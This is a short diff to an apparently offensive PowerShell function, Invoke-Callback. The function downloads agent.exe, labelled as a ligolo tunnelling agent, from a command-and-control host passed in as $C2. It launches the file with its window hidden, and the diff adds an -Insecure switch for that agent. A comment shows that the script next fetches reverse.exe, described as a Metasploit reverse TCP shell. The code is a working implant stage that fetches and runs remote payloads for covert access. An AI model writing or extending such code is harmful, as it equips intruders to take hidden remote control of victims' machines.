@@ -1,7 +1,10 @@
 function Invoke-Callback {
     param(
         [Parameter(Mandatory=$true)]
-        [string]$C2
+        [string]$C2,
+        
+        [Parameter()]
+        [switch]$Insecure
     )
 
     # ----------------------------------------
@@ -18,7 +21,18 @@ function Invoke-Callback {
     # Download & launch agent.exe (ligolo)
     # ----------------------------------------
     Invoke-WebRequest "http://$C2/payloads/agent.exe" -OutFile $agentPath
-    Start-Process $agentPath -WindowStyle Hidden
+    
+    # Build arguments based on Insecure flag
+    $agentArgs = @()
+    if ($Insecure) {
+        $agentArgs += "-insecure"
+    }
+    
+    if ($agentArgs.Count -gt 0) {
+        Start-Process $agentPath -ArgumentList $agentArgs -WindowStyle Hidden
+    } else {
+        Start-Process $agentPath -WindowStyle Hidden
+    }
 
     # ----------------------------------------
     # Download & launch reverse.exe (Msf rev tcp)
